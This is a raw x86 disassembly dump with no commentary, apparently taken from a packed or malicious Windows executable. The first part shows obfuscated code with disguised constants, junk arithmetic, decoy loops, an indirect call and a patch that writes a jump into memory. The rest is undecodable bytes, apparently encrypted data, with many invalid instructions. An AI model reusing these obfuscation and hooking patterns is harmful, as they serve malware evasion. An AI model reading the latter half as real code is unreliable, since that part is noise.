  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0x732e9125
  4056ec:	arpl   bx,dx
  4056ee:	pop    edi
  4056ef:	jl     0x40576d
  4056f1:	dec    edx
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	adc    eax,0x7a874229
  4056fa:	or     bl,BYTE PTR [eax-0x5db13011]
  405700:	dec    edi
  405701:	mov    dh,0x85
  405703:	mov    ecx,0xcc1f0d40
  405708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405709:	sub    BYTE PTR [esi+0x7ad5827],cl
  40570f:	test   cl,0x46
  405712:	sbb    eax,0x449157e7
  405717:	andnps xmm6,XMMWORD PTR [edi-0x40]
  40571b:	ds adc edx,esi
  40571e:	shr    BYTE PTR [esi-0x73de212],cl
  405724:	je     0x4056ae
  405726:	add    al,0x2
  405728:	or     ebp,DWORD PTR [ebp-0x2b40a2ef]
  40572e:	push   ecx
  40572f:	jl     0x405781
  405731:	xchg   ecx,eax
  405732:	or     bl,BYTE PTR [eax+edx*1-0x35399847]
  405739:	cmc    
  40573a:	loope  0x40578a
  40573c:	sub    bl,BYTE PTR [ebx+0x72e41e8b]
  405742:	iret   
  405743:	call   DWORD PTR [eax+0x75]
  405746:	xor    BYTE PTR [ebx-0x1b],ah
  405749:	fiadd  DWORD PTR ds:0xb77f6996
  40574f:	cli    
  405750:	stos   BYTE PTR es:[edi],al
  405751:	jae    0x405787
  405753:	ins    BYTE PTR es:[edi],dx
  405754:	jecxz  0x40577a
  405756:	ja     0x40570a
  405758:	dec    ebp
  405759:	sub    eax,0x11f5a01f
  40575e:	cwde   
  40575f:	iret   
  405760:	pushf  
  405761:	mov    ebx,0xa519ea5d
  405766:	in     al,0xa5
  405768:	push   eax
  405769:	dec    ebx
  40576a:	js     0x405765
  40576c:	mov    esp,0xc37d5d4b
  405771:	or     eax,0xe6aef24d
  405776:	test   edi,esi
  405778:	aam    0xd8
  40577a:	inc    esi
  40577b:	push   es
  40577c:	pop    ecx
  40577d:	adc    dl,BYTE PTR [edi-0x66]
  405780:	add    bh,BYTE PTR [edx+0x4a85e17b]
  405786:	rcr    BYTE PTR [edx],0x5f
  405789:	xchg   DWORD PTR [edi-0x41],ebx
  40578c:	pop    ss
  40578d:	rcr    DWORD PTR [ebx+0x1a6c2656],1
  405793:	mov    ebx,0xb082dbb6
  405798:	(bad)  
  405799:	sub    al,BYTE PTR [ecx+0x3d]
  40579c:	push   edx
  40579d:	fiadd  DWORD PTR [ecx]
  40579f:	clc    
  4057a0:	pop    ecx
  4057a1:	rol    DWORD PTR [esi],cl
  4057a3:	(bad)  
  4057a4:	dec    eax
  4057a5:	mov    cl,0xbc
  4057a7:	imul   edi,DWORD PTR [edx-0x4a4bef0c],0x3929599f
  4057b1:	mov    edx,0x6b8e28
  4057b6:	cmp    ch,bl
  4057b8:	adc    al,0xcb
  4057ba:	jmp    0xbf9b:0x72ca86a8
  4057c1:	packssdw mm3,QWORD PTR [eax+ebp*8+0x59]
  4057c6:	outs   dx,DWORD PTR ds:[esi]
  4057c7:	dec    ebp
  4057c8:	and    edx,edx
  4057ca:	fstp   DWORD PTR [ebx-0x6c55d31a]
  4057d0:	xchg   BYTE PTR [edi+edi*4-0x7d5cf530],ah
  4057d7:	add    al,0x1b
  4057d9:	cmc    
  4057da:	xchg   ebp,eax
  4057db:	jb     0x40578b
  4057dd:	xchg   ebp,eax
  4057de:	enter  0x2103,0xba
  4057e2:	push   eax
  4057e3:	xchg   BYTE PTR [ebx+0x48],al
  4057e6:	lods   al,BYTE PTR fs:[esi]
  4057e8:	jg     0x405843
  4057ea:	jmp    0x9e17:0x9aa6b589
  4057f1:	jns    0x405817
  4057f3:	ret    
  4057f4:	loope  0x40581d
  4057f6:	iret   
  4057f7:	dec    edi
  4057f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057f9:	retf   0x8452
  4057fc:	and    bp,dx
  4057ff:	xor    ch,ah
  405801:	cmp    ebx,DWORD PTR ds:[ebp-0x14]
  405805:	stos   DWORD PTR es:[edi],eax
  405806:	gs icebp 
  405808:	test   BYTE PTR [edx+0x44],dl
  40580b:	and    ebp,ecx
  40580d:	test   al,0x81
  40580f:	stos   BYTE PTR es:[edi],al
  405810:	call   0xb659b88a
  405815:	or     edx,DWORD PTR [edi+0x5a]
  405818:	fwait
  405819:	retf   
  40581a:	test   DWORD PTR [ebp-0x35],esi
  40581d:	and    cl,BYTE PTR [esi-0xf6b6be7]
  405823:	retf   0x4866
  405826:	fistp  DWORD PTR [eax]
  405828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405829:	popf   
  40582a:	jbe    0x405812
  40582c:	mov    eax,ds:0xb77d55b7
  405831:	arpl   WORD PTR [eax+0x33829ab4],di
  405837:	add    dl,bl
  405839:	imul   esp,DWORD PTR [ebp+eiz*4-0x2f15679f],0x799e5929
  405844:	cmp    eax,ecx
  405846:	cmp    DWORD PTR ds:0xdfca3353,edx
  40584c:	scas   eax,DWORD PTR es:[edi]
  40584d:	sahf   
  40584e:	sar    edi,1
  405850:	lahf   
  405851:	in     al,dx
  405852:	je     0x405884
  405854:	aam    0x5d
  405856:	imul   edx,ecx,0x7a4d8de6
  40585c:	jae    0x4058a9
  40585e:	out    dx,al
  40585f:	retf   0xadcf
  405862:	and    bh,0x8c
  405865:	mov    ah,0x34
  405867:	cli    
  405868:	cmp    eax,DWORD PTR [edx]
  40586a:	je     0x4058cc
  40586c:	mov    dl,0x5e
  40586e:	int3   
  40586f:	pop    eax
  405870:	adc    DWORD PTR [ebx+eax*4-0x4b31a596],0x42
  405878:	scas   al,BYTE PTR es:[edi]
  405879:	dec    esp
  40587a:	and    edi,DWORD PTR [eax+0x33]
  40587d:	bswap  esi
  40587f:	test   cl,ch
  405881:	lea    eax,[ebp+0x45]
  405884:	scas   eax,DWORD PTR es:[edi]
  405885:	pop    edx
  405886:	repnz test eax,0x7409fc64
  40588c:	pusha  
  40588d:	outs   dx,DWORD PTR ds:[esi]
  40588e:	popf   
  40588f:	inc    ecx
  405890:	dec    edi
  405891:	loopne 0x405890
  405893:	pop    ecx
  405894:	xchg   edx,eax
  405895:	xchg   edx,eax
  405896:	lods   al,BYTE PTR ds:[esi]
  405897:	(bad)  
  405898:	out    dx,eax
  405899:	jg     0x405908
  40589b:	sub    BYTE PTR ds:[bp+di],bl
  40589f:	ret    
  4058a0:	mov    ebx,0x2cffa981
  4058a5:	cmp    dl,al
  4058a7:	stos   DWORD PTR es:[edi],eax
  4058a8:	push   eax
  4058a9:	push   es
  4058aa:	sbb    DWORD PTR [ebx],0xffffffed
  4058ad:	call   0xbcfa:0x1fa5dc2d
  4058b4:	leave  
  4058b5:	jae    0x405878
  4058b7:	mov    ebp,esp
  4058b9:	mov    eax,0x8ff313fa
  4058be:	int3   
  4058bf:	pop    ecx
  4058c0:	mov    esp,0x56080ce3
  4058c5:	dec    ebx
  4058c6:	mov    ecx,0x9601ac4e
  4058cb:	cmp    al,0x86
  4058cd:	cmp    ebp,DWORD PTR ds:0x9795198a
  4058d3:	push   DWORD PTR [edi-0x46]
  4058d6:	inc    ebp
  4058d7:	test   BYTE PTR [ecx+0x3f],dl
  4058da:	sub    DWORD PTR [ebx-0x40],esi
  4058dd:	cmp    DWORD PTR [esi+edi*8-0x311886dc],esp
  4058e4:	jbe    0x405873
  4058e6:	fld    TBYTE PTR [edx+0x49]
  4058e9:	fisub  WORD PTR ds:0x1ebc88fc
  4058ef:	pop    esp
  4058f0:	dec    ecx
  4058f1:	mov    bh,0xe1
  4058f3:	popa   
  4058f4:	call   0xb3503d2f
  4058f9:	imul   ebp,DWORD PTR [ebp+0x56098136],0xce2eb71
  405903:	popa   
  405904:	test   DWORD PTR [edi],edx
  405906:	cld    
  405907:	mov    WORD PTR [eax],cs
  405909:	push   ebp
  40590a:	push   0x95223134
  40590f:	into   
  405910:	jae    0x405967
  405912:	pop    ebx
  405913:	mov    eax,ebx
  405915:	push   edx
  405916:	mov    eax,ds:0x10d64b2f
  40591b:	aaa    
  40591c:	pop    esi
  40591d:	daa    
  40591e:	cmp    al,0xcf
  405920:	fdiv   DWORD PTR [edi-0x6f]
  405923:	ja     0x40592c
  405925:	leave  
  405926:	dec    esp
  405927:	xor    BYTE PTR [edx-0x2e2215d9],bl
  40592d:	sahf   
  40592e:	fwait
  40592f:	mov    ds:0x1df90be6,eax
  405934:	shl    DWORD PTR [edx-0x31b9f714],cl
  40593a:	(bad)  
  40593b:	in     al,dx
  40593c:	xchg   DWORD PTR [esi+0xc],edx
  40593f:	add    esp,DWORD PTR [ebp-0x34]
  405942:	dec    edi
  405943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405944:	jno    0x405959
  405946:	push   cs
  405947:	es ins BYTE PTR es:[edi],dx
  405949:	push   esi
  40594a:	mov    ebp,0x9249e1d7
  40594f:	xchg   DWORD PTR [ebx+esi*8-0x2e],edi
  405953:	test   BYTE PTR es:[edi+0x22],dh
  405957:	cmp    edi,esi
  405959:	dec    esi
  40595a:	in     al,dx
  40595b:	mov    ecx,0xdabdc357
  405960:	retf   0xe7a2
  405963:	inc    esi
  405964:	or     ah,dh
  405966:	jo     0x4059e1
  405968:	mov    dh,0x1d
  40596a:	fs cmp al,0x5c
  40596d:	(bad)  [ecx]
  40596f:	mov    dl,0x56
  405971:	or     BYTE PTR [edi+0x56],0xcf
  405975:	test   BYTE PTR [esp+edx*1],bh
  405978:	fsubr  DWORD PTR [ebx+0x7d]
  40597b:	inc    esi
  40597c:	mov    fs,WORD PTR [esi+0x633e3d23]
  405982:	ret    
  405983:	ror    BYTE PTR [ebx+0x31],cl
  405986:	cmp    al,0x53
  405988:	lods   eax,DWORD PTR ds:[esi]
  405989:	mov    edx,0x974fdb40
  40598e:	mov    esi,0xb4b8d868
  405993:	pop    edi
  405994:	lods   eax,DWORD PTR ds:[esi]
  405995:	stc    
  405996:	inc    ebx
  405997:	mov    bh,0x82
  405999:	mov    ebp,0xed40d14c
  40599e:	xchg   esi,eax
  40599f:	jle    0x4059b2
  4059a1:	pop    edi
  4059a2:	push   es
  4059a3:	jns    0x4059f7
  4059a5:	sbb    bh,BYTE PTR [bp+di]
  4059a8:	jmp    0x4059c9
  4059aa:	pusha  
  4059ab:	popa   
  4059ac:	(bad)  
  4059ad:	(bad)  
  4059af:	xchg   edi,eax
  4059b0:	out    dx,al
  4059b1:	mov    ds,esp
  4059b3:	mov    WORD PTR [ecx],fs
  4059b5:	fild   WORD PTR ds:0x6984de48
  4059bb:	lea    ebp,[eax]
  4059bd:	inc    eax
  4059be:	lea    edi,[ecx-0x69]
  4059c1:	pusha  
  4059c2:	call   0xba440452
  4059c7:	or     eax,0xa64f2846
  4059cc:	mov    es,WORD PTR [ecx+0x4494d433]
  4059d2:	and    DWORD PTR [ebx-0x32],ebp
  4059d5:	pushf  
  4059d6:	pop    ecx
  4059d8:	and    al,dl
  4059da:	add    BYTE PTR [ecx+eax*8+0x404b4491],dh
  4059e1:	mov    cs,WORD PTR [ebp+edi*8-0x5b966f95]
  4059e8:	sbb    eax,0xeeeba647
  4059ee:	cmp    al,0x38
  4059f0:	push   0x46
  4059f2:	jno    0x405a66
  4059f4:	pop    ds
  4059f5:	enter  0x5557,0x99
  4059f9:	inc    eax
  4059fa:	xchg   esi,eax
  4059fb:	cdq    
  4059fc:	(bad)  
  4059fd:	das    
  4059fe:	cmp    esp,DWORD PTR [ecx-0x6]
  405a01:	pop    esi
  405a02:	shl    BYTE PTR [ecx+0x53],1
  405a05:	push   ss
  405a06:	sahf   
  405a07:	cmp    BYTE PTR [edx],bh
  405a09:	pop    eax
  405a0a:	cmp    ecx,DWORD PTR [edi+0x740347f3]
  405a10:	rol    al,0x52
  405a13:	mov    edi,0x415c158e
  405a18:	cmp    DWORD PTR [eax+eax*1],esi
  405a1b:	add    ebx,DWORD PTR [eax]
  405a1d:	adc    DWORD PTR [eax],ebx
  405a1f:	mov    edx,0x26394c83
  405a24:	rol    edx,cl
  405a26:	sub    ah,bh
  405a28:	mov    esi,0xf5ca1a73
  405a2d:	outs   dx,DWORD PTR ds:[esi]
  405a2e:	add    eax,0x92a4134f
  405a33:	aaa    
  405a34:	mov    bh,0xbb
  405a36:	int    0x4d
  405a38:	pop    edx
  405a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3a:	pop    ecx
  405a3b:	inc    ecx
  405a3c:	nop
  405a3d:	add    dh,cl
  405a3f:	mov    al,0x59
  405a41:	or     bh,BYTE PTR [edx+0x14b35e69]
  405a47:	mov    bl,0xde
  405a49:	mov    cl,0xc
  405a4b:	mov    ebp,0x90ffe029
  405a50:	je     0x405a52
  405a52:	rol    DWORD PTR [ebx+0x22],1
  405a55:	iret   
  405a56:	daa    
  405a57:	test   al,0x89
  405a59:	int3   
  405a5a:	rcr    DWORD PTR [edx+0x7d],1
  405a5d:	inc    edi
  405a5e:	jbe    0x405a77
  405a60:	out    0xef,al
  405a62:	sub    DWORD PTR [edi+0x6],eax
  405a65:	lock fwait
  405a67:	test   DWORD PTR [eax-0x34b38f15],edi
  405a6d:	inc    edi
  405a6e:	mov    ?,edi
  405a70:	mov    esi,0x6165456a
  405a75:	data16 div BYTE PTR [esi-0x60]
  405a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a7a:	sbb    esi,edi
  405a7c:	dec    esi
  405a7e:	aam    0x17
  405a80:	inc    ebp
  405a81:	stc    
  405a82:	ror    esi,cl
  405a84:	push   esi
  405a85:	les    edx,FWORD PTR [ebx+0x6f]
